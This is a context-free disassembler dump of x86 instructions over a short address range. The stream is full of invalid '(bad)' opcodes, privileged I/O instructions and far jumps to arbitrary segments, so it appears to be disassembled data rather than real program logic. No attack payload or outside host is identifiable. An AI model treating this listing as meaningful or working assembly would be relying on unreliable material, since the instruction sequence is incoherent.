  422062:	add    al,0xfb
  422064:	mov    edi,ds
  422066:	sub    DWORD PTR [esi],eax
  422068:	pop    es
  422069:	test   DWORD PTR [eax+0x6b18509],0x8187ab
  422073:	(bad)  
  422074:	mov    dl,0xba
  422076:	lods   eax,DWORD PTR ds:[esi]
  422077:	add    DWORD PTR [ecx-0x202b927b],edi
  42207d:	mov    edi,0x23607bec
  422082:	hlt    
  422083:	xor    cl,BYTE PTR [eax]
  422085:	mov    al,0x48
  422087:	push   eax
  422088:	dec    ebx
  422089:	ret    
  42208a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42208b:	mov    al,ds:0x8f9f915e
  422090:	enter  0xc4d7,0x3c
  422094:	or     esp,DWORD PTR [esi]
  422096:	enter  0x2179,0x14
  42209a:	stc    
  42209b:	jnp    0x4220e4
  42209d:	add    DWORD PTR [ebp+edi*2-0x7c],eax
  4220a1:	jmp    0x4220c6
  4220a3:	mov    dl,0x79
  4220a5:	lahf   
  4220a6:	ror    BYTE PTR [esi*2+0x34676916],cl
  4220ad:	stc    
  4220ae:	jnp    0x4220d1
  4220b0:	mov    ch,0xb4
  4220b2:	cmp    DWORD PTR [ebp+0x3cc7e054],edi
  4220b8:	pop    edx
  4220b9:	pushf  
  4220ba:	lock adc BYTE PTR [eax-0x8],ch
  4220be:	shl    BYTE PTR [ebp-0x79],1
  4220c1:	sub    al,0x37
  4220c3:	int    0xaa
  4220c5:	fild   DWORD PTR [ebx+0x1a]
  4220c8:	mov    ch,0xb3
  4220ca:	lahf   
  4220cb:	shl    BYTE PTR [edx+0x47590c20],1
  4220d1:	data16 jb 0x4220fd
  4220d4:	adc    edx,DWORD PTR [ebx]
  4220d6:	mov    eax,ds:0xf7caacc2
  4220db:	inc    eax
  4220dc:	pusha  
  4220dd:	lods   al,BYTE PTR ds:[esi]
  4220de:	lea    esi,[eax+0x31]
  4220e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e2:	mov    ecx,0x927649c
  4220e7:	jmp    0x52d9d1c3
  4220ec:	das    
  4220ed:	add    eax,0x144d388f
  4220f2:	mov    dl,0x40
  4220f4:	fisub  DWORD PTR [esi]
  4220f6:	inc    edi
  4220f7:	cs xchg edi,eax
  4220f9:	jle    0x4220fd
  4220fb:	in     al,0x8d
  4220fd:	jg     0x422128
  4220ff:	mov    al,ds:0xfbde111c
  422104:	mov    ebx,0x1d6a549c
  422109:	hlt    
  42210a:	dec    ebx
  42210b:	pop    esp
  42210c:	test   eax,0xb6a81032
  422111:	and    BYTE PTR [ebx],ch
  422113:	outs   dx,BYTE PTR ds:[esi]
  422114:	(bad)  
  422115:	scas   eax,DWORD PTR es:[edi]
  422116:	enter  0x9ccc,0x4a
  42211a:	es or  eax,0x36d3ebc5
  422120:	mov    al,ds:0x391385cc
  422125:	inc    edx
  422126:	and    DWORD PTR [ebx+ecx*4-0x62],esi
  42212a:	inc    BYTE PTR [ecx]
  42212c:	and    al,0x78
  42212e:	ret    0x196b
  422131:	cmc    
  422132:	cmp    esp,DWORD PTR [edx-0x72]
  422135:	push   0x854b8d8
  42213a:	ins    BYTE PTR es:[edi],dx
  42213b:	xor    eax,edx
  42213d:	jecxz  0x422147
  42213f:	jae    0x42217d
  422141:	ins    DWORD PTR es:[edi],dx
  422142:	(bad)  
  422143:	jp     0x4220e2
  422145:	sub    ah,BYTE PTR [ebx+0x341b5fe6]
  42214b:	inc    ebp
  42214c:	xchg   cl,ch
  42214e:	sub    ecx,ebx
  422150:	std    
  422151:	sub    ecx,ecx
  422153:	iret   
  422154:	ins    BYTE PTR es:[edi],dx
  422155:	mov    ah,0x1e
  422157:	fdiv   QWORD PTR [edx]
  422159:	mov    edi,0x58409345
  42215e:	in     eax,dx
  42215f:	xchg   esp,eax
  422160:	rol    DWORD PTR [esi+ecx*4+0x3d2a38e0],cl
  422167:	push   eax
  422168:	pop    eax
  422169:	icebp  
  42216a:	cmc    
  42216b:	je     0x4221da
  42216d:	xchg   edx,eax
  42216e:	push   ebp
  42216f:	sti    
  422170:	lock (bad) 
  422172:	mov    bh,0x25
  422174:	mov    esi,0x555fd0b2
  422179:	jno    0x4221d3
  42217b:	cmp    DWORD PTR [eax+0x2de1c472],esi
  422181:	loop   0x4221cf
  422183:	es dec edi
  422185:	cmp    eax,0x90a76151
  42218a:	stos   DWORD PTR es:[edi],eax
  42218b:	data16 outs dx,BYTE PTR ds:[esi]
  42218d:	repz push ss
  42218f:	xor    al,0xb4
  422191:	fadd   st,st(6)
  422193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422194:	mov    al,0x1e
  422196:	inc    ebx
  422197:	xchg   DWORD PTR [edi],ebp
  422199:	add    dh,dl
  42219b:	ins    BYTE PTR es:[edi],dx
  42219c:	xchg   esp,eax
  42219d:	add    esi,DWORD PTR [eax+0x2c]
  4221a0:	jno    0x4221d4
  4221a2:	adc    al,0xc5
  4221a4:	cmp    cl,bl
  4221a6:	mov    eax,0x7cbaecfb
  4221ab:	mov    bl,0x25
  4221ad:	jmp    0x4221e1
  4221af:	test   eax,0xdf37ee3a
  4221b4:	out    0x99,eax
  4221b6:	jb     0x4221ef
  4221b8:	sbb    ah,ch
  4221ba:	ret    
  4221bb:	jnp    0x422164
  4221bd:	xchg   edi,eax
  4221be:	es (bad) 
  4221c1:	xchg   ebx,eax
  4221c2:	call   0x98f2:0x14dbf728
  4221c9:	xor    al,0x61
  4221cb:	rcr    BYTE PTR [edi+0x754637c2],1
  4221d1:	xchg   esi,edi
  4221d3:	fucomip st,st(2)
  4221d5:	out    dx,eax
  4221d6:	or     eax,eax
  4221d8:	sub    eax,0x28618c81
  4221dd:	xchg   ebx,eax
  4221de:	ror    BYTE PTR [eax],1
  4221e0:	dec    esp
  4221e1:	lds    esp,FWORD PTR [ecx-0x51]
  4221e4:	cli    
  4221e5:	int3   
  4221e6:	add    esi,ebp
  4221e8:	bound  ebp,QWORD PTR [ebx]
  4221ea:	(bad)  
  4221eb:	fs and al,0x26
  4221ee:	out    dx,al
  4221ef:	icebp  
  4221f0:	dec    edx
  4221f1:	xchg   ebx,eax
  4221f2:	outs   dx,BYTE PTR ds:[esi]
  4221f3:	xchg   BYTE PTR [eax],bh
  4221f5:	aaa    
  4221f6:	daa    
  4221f7:	(bad)  
  4221f8:	jno    0x422265
  4221fa:	push   ebx
  4221fb:	out    dx,eax
  4221fc:	sub    DWORD PTR ds:0xbe7da953,0xffffffb8
  422203:	push   esp
  422204:	mov    ecx,0xaefcd53b
  422209:	and    BYTE PTR [ebx-0xef5393a],dh
  42220f:	mov    eax,0x59d629c3
  422214:	and    DWORD PTR [esi+0x3c],ebx
  422217:	xor    DWORD PTR [edx*1+0x31798bcd],esp
  42221e:	dec    esp
  42221f:	repnz into 
  422221:	xchg   ebx,eax
  422222:	fiadd  WORD PTR [ecx+0x75c3bf48]
  422228:	adc    BYTE PTR ds:0xbed763a,al
  42222e:	int3   
  42222f:	xor    BYTE PTR [edi],dl
  422231:	dec    edi
  422232:	pop    edi
  422233:	(bad)  
  422234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422235:	les    esi,FWORD PTR [edi-0x18]
  422238:	add    al,0x8d
  42223a:	add    eax,0xcedd684f
  42223f:	loopne 0x422296
  422241:	iret   
  422242:	xor    edi,esi
  422244:	ss rcr edi,cl
  422247:	pop    ss
  422248:	ins    DWORD PTR es:[edi],dx
  422249:	xor    bh,BYTE PTR [edi-0x727fcf38]
  42224f:	push   esi
  422250:	(bad)  
  422251:	out    dx,eax
  422252:	iret   
  422253:	mov    cl,0xae
  422255:	loop   0x4221dd
  422257:	mov    cl,0x6a
  422259:	jnp    0x4221e9
  42225b:	stos   DWORD PTR es:[edi],eax
  42225c:	or     edx,DWORD PTR [ebx+ebx*8-0x2a8a2a7e]
  422263:	mov    cs,WORD PTR [eax]
  422265:	arpl   WORD PTR [edi-0x4f],si
  422268:	mov    eax,gs
  42226a:	sub    DWORD PTR [edi+0x2c],ebp
  42226d:	and    eax,0x5466ee67
  422272:	jle    0x422298
  422274:	mov    eax,ds:0x7f00ff76
  422279:	xor    eax,0x4659c753
  42227e:	cmp    eax,0xb49bb465
  422283:	push   ecx
  422284:	lahf   
  422285:	js     0x422212
  422287:	dec    ebx
  422288:	sub    BYTE PTR [ebx],al
  42228a:	enter  0x95cf,0xb2
  42228e:	push   es
  42228f:	xchg   edi,eax
  422290:	inc    eax
  422291:	cmp    al,0xd7
  422293:	add    DWORD PTR [edx],edi
  422295:	outs   dx,DWORD PTR ds:[esi]
  422296:	clc    
  422297:	(bad)  
  422298:	je     0x42225f
  42229a:	lea    ebx,[esi+0x32eeee6]
  4222a0:	aad    0xf7
  4222a2:	mov    ecx,ecx
  4222a4:	outs   dx,DWORD PTR ds:[esi]
  4222a5:	daa    
  4222a6:	xor    al,0x20
  4222a8:	aam    0x78
  4222aa:	mov    eax,0x921c5330
  4222af:	adc    BYTE PTR [eax-0x65e337dd],al
  4222b5:	inc    esi
  4222b6:	fsub   DWORD PTR [eax+ebx*2+0x68]
  4222ba:	jno    0x422257
  4222bc:	sub    ah,BYTE PTR [edi]
  4222be:	jb     0x422297
  4222c0:	dec    esi
  4222c1:	addr16 je 0x42228d
  4222c4:	pop    esp
  4222c5:	sub    eax,0x263b9fd9
  4222ca:	mov    eax,0xd82200e2
  4222cf:	xor    eax,0x5bb98364
  4222d4:	stos   BYTE PTR es:[edi],al
  4222d5:	inc    edi
  4222d6:	inc    ebx
  4222d7:	jg     0x4222fa
  4222d9:	mov    al,0x66
  4222db:	add    ah,BYTE PTR [eax+0x42799195]
  4222e1:	lock aaa 
  4222e3:	call   0xe60a:0x36fc6744
  4222ea:	aas    
  4222eb:	loope  0x422298
  4222ed:	cmc    
  4222ee:	dec    esi
  4222ef:	(bad)  
  4222f0:	mov    esp,0xb87bf76e
  4222f5:	in     al,0xde
  4222f7:	cmp    al,0xb6
  4222f9:	ds inc esp
  4222fb:	repnz out 0x9,al
  4222fe:	outs   dx,BYTE PTR ds:[esi]
  4222ff:	ja     0x4222b1
  422301:	inc    esp
  422302:	adc    bh,al
  422304:	dec    edi
  422305:	arpl   WORD PTR [ebx-0x25052740],bx
  42230b:	pop    edx
  42230c:	ret    
  42230d:	retf   0x2e59
  422310:	rcpps  xmm1,XMMWORD PTR [edx+0x7b]
  422314:	or     BYTE PTR [esi-0x22d6f607],0x19
  42231b:	leave  
  42231c:	das    
  42231d:	fisttp DWORD PTR [esi-0x60]
  422320:	cdq    
  422321:	adc    al,0xfc
  422323:	xchg   edi,eax
  422324:	adc    DWORD PTR [eax-0x502bc9f1],0x9ec69509
  42232e:	sub    BYTE PTR [edi-0x4ceb7065],0x0
  422335:	jb     0x422372
  422337:	or     al,0xb3
  422339:	jmp    0x9546:0xdd6c00c1
  422340:	sub    al,0xde
  422342:	ds jge 0x422324
  422345:	mov    esi,0xf343064
  42234a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42234b:	cmp    ecx,esi
  42234d:	mov    al,ds:0x56622d8e
  422352:	pop    eax
  422353:	(bad)  
  422354:	and    BYTE PTR [ebx-0x17025238],ch
  42235a:	jo     0x422391
  42235c:	inc    eax
  42235d:	pop    eax
  42235e:	ficom  DWORD PTR [ecx-0x6b]
  422361:	push   cs
  422362:	shl    BYTE PTR [esi],cl
  422364:	xchg   ebp,eax
  422365:	sub    BYTE PTR [edx],ch
  422367:	fiadd  WORD PTR [edx-0x7eeec60a]
  42236d:	out    dx,al
  42236e:	jns    0x422348
  422370:	mov    ah,0x52
  422372:	xchg   ebx,eax
  422373:	cmp    edx,DWORD PTR [ebp-0x434fabb7]
  422379:	ds loop 0x4223b6
  42237c:	mov    cl,0x7e
  42237e:	enter  0x92d,0x66
  422382:	push   edx
  422383:	shr    BYTE PTR [eax],1
  422385:	cli    
  422386:	bound  edx,QWORD PTR [edx+0xfa0694]
	...
  4223a8:	add    BYTE PTR [eax],al
  4223aa:	inc    edx
  4223ab:	inc    esp
  4223ac:	inc    ebx
  4223ad:	push   edi
  4223ae:	inc    edi
  4223af:	push   edi
  4223b0:	push   esi
  4223b1:	push   ebp
  4223b2:	outs   dx,DWORD PTR ds:[esi]
  4223b3:	pop    ebp
  4223b4:	mov    ds:0x97ea74dc,eax
  4223b9:	cmp    eax,0x1b198
  4223be:	mov    DWORD PTR [esi],eax
  4223c0:	add    BYTE PTR [eax],al
  4223c2:	in     eax,dx
  4223c3:	test   al,0x7f
  4223c5:	cmp    al,0x81
  4223c7:	hlt    
  4223c8:	lea    eax,[edi+0x36]
  4223cb:	adc    DWORD PTR [eax+esi*4-0x54e5c7b],esi
  4223d2:	or     al,0xdc
  4223d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223d5:	push   esi
  4223d6:	cmp    edx,DWORD PTR [edx-0x4e]
  4223d9:	sub    al,0x86
  4223db:	pop    eax
  4223dc:	add    al,0x4f
  4223de:	cld    
  4223df:	aas    
  4223e0:	arpl   WORD PTR [ebp+eiz*1-0x5e3e20c6],di
  4223e7:	repz clc 
  4223e9:	lods   eax,DWORD PTR ds:[esi]
  4223ea:	jp     0x42240d
  4223ec:	pusha  
  4223ed:	sub    esp,DWORD PTR [ebx-0x74]
  4223f0:	adc    BYTE PTR [edi+0x70620a04],ah
  4223f6:	adc    edx,edi
  4223f8:	cmp    BYTE PTR [ebx-0x24],al
  4223fb:	xlat   BYTE PTR ds:[ebx]
  4223fc:	loope  0x422413
  4223fe:	pusha  
  4223ff:	jmp    0xb461:0x7838afaa
  422406:	aas    
  422407:	mov    esp,0x7fdc8ac2
  42240c:	call   0xf9d4:0x5b355128
  422413:	in     eax,dx
  422414:	mov    eax,0xd9b1fd8d
  422419:	xchg   ecx,eax
  42241a:	pop    eax
  42241b:	(bad)  
  42241c:	dec    esi
  42241d:	cmp    BYTE PTR [eax+0x3581a932],al
  422423:	sbb    eax,0x839198f3
  422428:	dec    ebp
  422429:	xor    WORD PTR [edx],ax
  42242c:	cmc    
  42242d:	out    dx,eax
  42242e:	inc    esp
  42242f:	xor    bl,bh
  422431:	leave  
  422432:	enter  0x8268,0xa8
  422436:	cld    
  422437:	add    bh,BYTE PTR ds:0xfeadcac
  42243d:	popf   
  42243e:	mov    ds:0xbd328e05,eax
  422443:	fsub   DWORD PTR [ebp+0x52]
  422446:	cmp    dl,BYTE PTR [edx-0xb040fd]
  42244c:	push   ebx
  42244d:	pusha  
  42244e:	inc    esi
  42244f:	push   ss
  422450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422451:	(bad)  
  422452:	nop
  422453:	adc    bh,BYTE PTR [ebp-0x73]
  422456:	loope  0x4223ee
  422458:	xor    dh,dl
  42245a:	repnz fcomi st,st(4)
  42245d:	imul   edi,DWORD PTR [edi],0x7eb6a0b6
  422463:	std    
  422464:	aad    0x42
  422466:	in     eax,0x51
  422468:	ret    
  422469:	dec    eax
  42246a:	test   BYTE PTR [edx],bl
  42246c:	sub    al,0xa8
  42246e:	loopne 0x4224a7
  422470:	(bad)  
  422471:	mov    dh,0xd5
  422473:	into   
  422474:	xlat   BYTE PTR ds:[ebx]
  422475:	loop   0x4224ce
  422477:	mov    bh,0xc2
  422479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247b:	cld    
  42247c:	and    BYTE PTR [esi+0x8],dh
  42247f:	les    edi,FWORD PTR [edx+0x65a1111]
  422485:	xor    al,0xb6
  422487:	pop    esi
  422488:	push   0xedb06e34
  42248d:	pop    esi
  42248e:	xchg   esp,eax
  42248f:	not    cl
  422491:	adc    ebx,DWORD PTR [edx-0x2f]
  422494:	pushf  
  422495:	dec    edx
  422496:	loope  0x4224d7
  422498:	inc    esp
  422499:	xchg   ebp,eax
  42249a:	(bad)  
  42249c:	jno    0x422487
  42249e:	and    ecx,DWORD PTR [ecx+eax*4]
  4224a1:	jo     0x4224c9
  4224a3:	(bad)  
  4224a4:	js     0x4224f4
  4224a6:	mov    WORD PTR [edx-0x23],?
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	scas   al,BYTE PTR es:[edi]
  4224ab:	jae    0x422516
  4224ad:	pusha  
  4224ae:	inc    esi
  4224af:	mov    WORD PTR [edi-0x6601be86],ds
  4224b5:	cli    
  4224b6:	add    DWORD PTR [esi-0x1ea314fb],ebx
  4224bc:	sahf   
  4224bd:	rol    esi,cl
  4224bf:	popa   
  4224c0:	fidivr WORD PTR ds:0x45b0911b
  4224c6:	js     0x42251c
  4224c8:	xor    DWORD PTR [ebx+0x5f],ecx
  4224cb:	push   edx
  4224cc:	sub    al,0xb5
  4224ce:	fxch   st(2)
  4224d0:	or     al,0x5e
  4224d2:	mov    ah,0xc7
  4224d4:	imul   edx,DWORD PTR ds:0x2461c656,0x3c
  4224db:	cld    
  4224dc:	int    0x92
  4224de:	daa    
  4224df:	out    0xe,al
  4224e1:	call   0x7eb:0xaa6995c0
  4224e8:	adc    eax,0x5d0bcc56
  4224ed:	sbb    eax,0x814c1f8e
  4224f2:	in     eax,0x8
  4224f4:	xor    esi,eax
  4224f6:	or     edx,DWORD PTR [eax]
  4224f8:	pop    esp
  4224f9:	shl    eax,1
  4224fb:	add    al,cl
  4224fd:	mov    edi,0x9fdefc80
  422502:	cmp    DWORD PTR [esi-0x6c],0x1eae718a
  422509:	enter  0xa0e,0x7e
  42250d:	xchg   DWORD PTR [ecx+0x27],esp
  422510:	push   edi
  422511:	sbb    esi,0x6f1c196
  422517:	dec    ebx
  422518:	mov    ah,0xba
  42251a:	pop    eax
  42251b:	test   DWORD PTR [ecx-0x62],esi
  42251e:	cli    
  42251f:	std    
  422520:	call   FWORD PTR [edi-0x6e]
  422523:	mov    eax,ds:0x7b75dd8f
  422528:	push   ecx
  422529:	sbb    BYTE PTR [esi],cl
  42252b:	or     ecx,esi
  42252d:	sbb    eax,DWORD PTR [edi-0x1d]
  422530:	test   DWORD PTR [ecx-0x3f],ecx
  422533:	add    eax,esp
  422535:	inc    esi
  422536:	jecxz  0x422538
  422538:	stos   DWORD PTR es:[edi],eax
  422539:	mov    eax,ds:0x7022fd1d
  42253e:	ret    0xb9a3
  422541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422542:	push   esp
  422543:	sbb    eax,0x17a08efb
  422548:	das    
  422549:	test   al,0xc1
  42254b:	mov    esi,0xbb770ba8
  422550:	push   ss
  422551:	push   ebx
  422552:	add    al,0xe
  422554:	xchg   ebp,eax
  422555:	xlat   BYTE PTR ds:[ebx]
  422556:	aam    0x5e
  422558:	fcomip st,st(4)
  42255a:	ffree  st(0)
  42255c:	loop   0x422593
  42255e:	in     eax,dx
  42255f:	fwait
  422560:	cs in  eax,0xfa
  422563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422564:	bound  edx,QWORD PTR [edi-0x6acb6a92]
  42256a:	mov    fs,WORD PTR [eax-0x27]
  42256d:	test   edx,ebx
  42256f:	push   ss
  422570:	cmp    al,0x26
  422572:	cmp    dl,bh
  422574:	sub    eax,0xf538e9dc
  422579:	xchg   esp,eax
  42257a:	lods   al,BYTE PTR ds:[esi]
  42257b:	and    DWORD PTR ds:[edi],eax
  42257e:	ret    0xf57b
  422581:	add    DWORD PTR [ecx],0x1b0370fa
  422587:	jmp    0xdbf5160b
  42258c:	lahf   
  42258d:	shl    BYTE PTR [esi],cl
  42258f:	fisubr DWORD PTR [ebx]
  422591:	xor    ebp,DWORD PTR [esi+0x1d]
  422594:	sbb    eax,0x83a72877
  422599:	jae    0x42259a
  42259b:	dec    ebp
  42259c:	jge    0x422558
  42259e:	loopne 0x4225c9
  4225a0:	jnp    0x42252b
  4225a2:	cs mov edi,0x48100641
  4225a8:	jmp    0x422533
  4225aa:	fcomp  st(2)
  4225ac:	mov    BYTE PTR [eax],0xa4
  4225af:	jns    0x6f6cc51d
  4225b5:	jne    0x422576
  4225b7:	jecxz  0x422607
  4225b9:	adc    bl,dh
  4225bb:	sti    
  4225bc:	mov    DWORD PTR [edx],edi
  4225be:	pop    esp
  4225bf:	mov    al,BYTE PTR [edx]
  4225c1:	movsx  esi,sp
  4225c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c5:	pushf  
  4225c6:	push   0x7bf6b211
  4225cb:	fs pop esi
  4225cd:	jle    0x422589
  4225cf:	sub    cl,BYTE PTR [edx]
  4225d1:	lds    edx,FWORD PTR [ecx-0x6b]
  4225d4:	test   eax,0x8a503be5
  4225d9:	xchg   BYTE PTR [ecx+0x6abaf0c0],ch
  4225df:	ins    BYTE PTR es:[edi],dx
  4225e0:	xchg   edi,eax
  4225e1:	lods   eax,DWORD PTR ds:[esi]
  4225e2:	dec    ecx
  4225e3:	jnp    0x42265e
  4225e5:	sub    al,BYTE PTR [ebp-0x4b4ecba7]
  4225eb:	mov    al,ds:0x5c452524
  4225f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f1:	repz (bad) 
  4225f3:	std    
  4225f4:	retf   0xd57b
  4225f7:	lea    esp,[eax-0x7c]
  4225fa:	call   0xe127:0xe2323150
  422601:	mov    dh,0x3f
  422603:	push   edx
  422604:	mov    DWORD PTR [ecx+edx*8-0x45],ebp
  422608:	or     DWORD PTR [edx-0x5ea4ccc4],ebx
  42260e:	mov    eax,ds:0x88b081b1
  422613:	mov    ah,BYTE PTR [edx-0x14]
  422616:	popf   
  422617:	xor    eax,0xff0fae00
  42261c:	pop    edx
  42261d:	sti    
  42261e:	outs   dx,BYTE PTR ds:[esi]
  42261f:	cwde   
  422620:	ins    DWORD PTR es:[edi],dx
  422621:	pop    edi
  422622:	shl    DWORD PTR [ecx+0x5ecbdd3b],1
  422628:	pop    ebx
  422629:	mov    esi,0x2ae02e30
  42262e:	and    BYTE PTR ds:0x123a9b5a,dh
  422634:	inc    DWORD PTR [edi-0x7a]
  422637:	pop    edx
  422638:	sub    BYTE PTR [ebp-0x17a15638],cl
  42263e:	xor    eax,0xa033fa2f
  422643:	dec    esi
  422645:	jo     0x422699
  422647:	mov    eax,0xee46cc4f
  42264c:	cs sbb edx,0xfb413f12
  422653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422654:	je     0x422692
  422656:	inc    ebp
  422657:	rcr    DWORD PTR [esi],0xb0
  42265a:	add    al,0x60
  42265c:	sbb    DWORD PTR [esp+ecx*2],ebx
  42265f:	out    dx,eax
  422660:	xor    eax,0xd11f17f0
  422665:	mov    edx,gs
  422667:	and    eax,0xc4e242b
  42266c:	clc    
  42266d:	add    ah,BYTE PTR [edi]
  42266f:	jae    0x4226a0
  422671:	xchg   ebp,eax
  422672:	fwait
  422673:	lfs    esi,FWORD PTR [edx+0x6f]
  422677:	sub    dl,bh
  422679:	outs   dx,DWORD PTR ds:[esi]
  42267a:	adc    al,0xe1
  42267c:	fisub  DWORD PTR [ebp-0x44272034]
  422682:	call   0x81f5ae6c
  422687:	sbb    eax,0x65f5e83b
  42268c:	aad    0x3c
  42268e:	mov    dl,0xb6
  422690:	xlat   BYTE PTR ds:[ebx]
  422691:	inc    edx
  422692:	out    dx,eax
  422693:	mov    dh,ah
  422695:	jnp    0x422712
  422697:	loop   0x4226ff
  422699:	in     al,0x8b
  42269b:	fcomi  st,st(1)
  42269d:	push   esi
  42269e:	test   DWORD PTR [ebx],esp
  4226a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a1:	mov    esi,DWORD PTR [ecx+eax*8]
  4226a4:	aad    0x9f
  4226a6:	lods   eax,DWORD PTR ds:[esi]
  4226a7:	adc    al,0x5c
  4226a9:	ins    BYTE PTR es:[edi],dx
  4226aa:	jp     0x4226d3
  4226ac:	mov    WORD PTR [ebx+0x73],?
  4226af:	(bad)  
  4226b0:	lea    esp,[ecx-0x1a]
  4226b3:	push   ecx
  4226b4:	push   esi
  4226b5:	data16 ins BYTE PTR es:[edi],dx
  4226b7:	cmp    DWORD PTR [esi],0xffffffc8
  4226ba:	xchg   ebx,eax
  4226bb:	int3   
  4226bc:	stc    
  4226bd:	out    dx,eax
  4226be:	in     al,dx
  4226bf:	pop    eax
  4226c0:	stc    
  4226c1:	pop    esi
  4226c2:	xchg   BYTE PTR [ecx+0x1c],dh
  4226c5:	int3   
  4226c6:	adc    al,BYTE PTR [ebp+esi*2-0x1e30e3b7]
  4226cd:	ds sub eax,0x3875c9cf
  4226d3:	sahf   
  4226d4:	add    DWORD PTR [edi+0x5189211f],edx
  4226da:	imul   ecx,DWORD PTR [esi+0x16],0xedf7c5be
  4226e1:	cmp    BYTE PTR [eax-0x5137dd69],dl
  4226e7:	dec    ebx
  4226e8:	xlat   BYTE PTR ds:[ebx]
  4226e9:	cld    
  4226ea:	cmp    ecx,DWORD PTR [esi+0x39cd2b13]
  4226f0:	popa   
  4226f1:	push   0x49
  4226f3:	rcr    BYTE PTR [bx+di-0x65],0x61
  4226f8:	cmp    esi,DWORD PTR [ebx+0x57]
  4226fb:	mov    ebp,0xc5f4989e
  422700:	xchg   DWORD PTR [ebx+edx*1],eax
  422703:	jne    0x42275d
  422705:	bound  esi,QWORD PTR [ebx]
  422707:	repz pop eax
  422709:	xchg   ebx,eax
  42270a:	fwait
  42270b:	add    DWORD PTR [esp+eiz*2-0x62],0x70
  422710:	pop    es
  422711:	inc    edx
  422712:	je     0x42272f
  422714:	sbb    al,0x1f
  422716:	mov    edi,?
  422718:	in     al,dx
  422719:	out    dx,eax
  42271a:	out    dx,al
  42271b:	mov    ah,0x6b
  42271d:	adc    DWORD PTR [esi-0x23e45c3f],ecx
  422723:	push   ecx
  422724:	sub    DWORD PTR [edi-0x1],ebp
  422727:	adc    edi,ebx
  422729:	jp     0x422770
  42272b:	cmp    al,BYTE PTR [ebx]
  42272d:	fidivr WORD PTR [edi]
  42272f:	les    eax,FWORD PTR [ecx+0x726d3e30]
  422735:	cmp    eax,0xa96cd877
  42273a:	sbb    eax,0x13a072d0
  42273f:	xchg   ecx,eax
  422740:	add    edi,DWORD PTR [eax]
  422742:	ins    DWORD PTR es:[edi],dx
  422743:	addr16 out dx,al
  422745:	xchg   BYTE PTR [ecx],cl
  422747:	mov    eax,ds:0x77f6254
  42274c:	inc    ebp
  42274d:	push   es
  42274e:	xor    esi,esi
  422750:	xor    DWORD PTR [ebp+0x611aa739],esp
  422756:	aas    
  422757:	iret   
  422758:	aam    0xa6
  42275a:	sbb    esp,eax
  42275c:	jg     0x42276d
  42275e:	fwait
  42275f:	nop
  422760:	inc    esi
  422761:	push   0x49
  422763:	mov    eax,ds:0x61098c94
  422768:	sub    BYTE PTR [ecx+0x3cafb691],0x8c
  42276f:	mov    ds:0x9d91a9f8,eax
  422774:	mov    eax,DWORD PTR [edi+0x18]
  422777:	pop    ss
  422778:	out    dx,eax
  422779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42277a:	xchg   esp,eax
  42277b:	sti    
  42277c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277d:	pop    ecx
  42277e:	pop    ebx
  42277f:	jno    0x4227f4
  422781:	mov    bh,0x94
  422783:	xchg   BYTE PTR [ebp-0xb16d735],bh
  422789:	mov    eax,ds:0xdd0d90fa
  42278e:	pop    es
  42278f:	(bad)  
  422790:	jae    0x42278f
  422792:	inc    esi
  422793:	cmc    
  422794:	xor    dl,bh
  422796:	xor    eax,0xd98df225
  42279b:	sbb    DWORD PTR [esi+ecx*2+0x1],esi
  42279f:	sbb    DWORD PTR [esp+ecx*2],ebx
  4227a2:	out    0xbf,al
  4227a4:	rcr    DWORD PTR [esi-0x13a6669d],cl
  4227aa:	push   edi
  4227ab:	and    ebx,0xa02e24de
  4227b1:	adc    dl,BYTE PTR [ecx]
  4227b3:	push   ds
  4227b4:	retf   
  4227b5:	imul   esp,DWORD PTR [edi-0xe],0xffffffe7
  4227b9:	mov    WORD PTR [esp+ebp*1-0x18b6de38],?
  4227c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c1:	push   edi
  4227c2:	dec    DWORD PTR [esi+0x39cd6795]
  4227c8:	retf   
  4227c9:	jbe    0x4227e7
  4227cb:	push   esi
  4227cc:	ret    
  4227cd:	rcr    BYTE PTR [eax+0x2b],cl
  4227d0:	scas   al,BYTE PTR es:[edi]
  4227d1:	les    esp,FWORD PTR [edi+0x35]
  4227d4:	adc    al,0x61
  4227d6:	popa   
  4227d7:	int3   
  4227d8:	ret    
  4227d9:	(bad)  
  4227da:	in     eax,0x63
  4227dc:	loope  0x4227db
  4227de:	into   
  4227df:	shr    DWORD PTR [eax],1
  4227e1:	and    al,0x75
  4227e3:	rcl    bl,1
  4227e5:	pop    eax
  4227e6:	jmp    0x422836
  4227e8:	fsubr  st,st(7)
  4227ea:	jl     0x422831
  4227ec:	(bad)  
  4227ed:	push   0x1af26ab
  4227f2:	hlt    
  4227f3:	scas   al,BYTE PTR es:[edi]
  4227f4:	cdq    
  4227f5:	aas    
  4227f6:	adc    ecx,ebx
  4227f8:	aam    0x6c
  4227fa:	and    BYTE PTR [edx+ecx*1-0x6e7cf77b],dl
  422801:	push   es
  422802:	cmc    
  422803:	mov    dh,0x5f
  422805:	in     eax,0xd8
  422807:	aaa    
  422808:	imul   eax,DWORD PTR [esi-0x35186e83],0xffffffee
  42280f:	not    BYTE PTR [ebp+0x7c9db27f]
  422815:	add    dh,BYTE PTR [eax+0x18]
  422818:	daa    
  422819:	push   eax
  42281a:	add    al,0x2a
  42281c:	lahf   
  42281d:	cli    
  42281e:	adc    al,ah
  422820:	sbb    edx,DWORD PTR [esi]
  422822:	(bad)  
